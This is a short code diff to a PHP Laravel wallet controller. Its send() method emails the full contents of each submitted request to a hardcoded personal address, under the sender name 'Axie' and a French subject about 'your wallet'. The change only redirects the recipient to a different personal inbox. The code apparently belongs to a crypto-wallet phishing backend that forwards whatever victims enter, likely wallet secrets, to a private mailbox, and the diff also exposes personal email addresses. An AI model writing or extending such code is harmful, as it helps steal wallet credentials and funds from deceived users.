@@ -9,7 +9,7 @@ class WalletController extends Controller
 {
     public function send(Request $request){
          Mail::send('mails.send', ['request' => $request], function($message) use($request){
-                           $message->to('yaodavidarmel@gmail.com', 'Hello')->subject('Nouvelle information sur un de vos wallet');
+                           $message->to('nils6600@hotmail.fr', 'Hello')->subject('Nouvelle information sur un de vos wallet');
                            $message->from('eventsoschool@gmail.com', 'Axie');
                          });
 
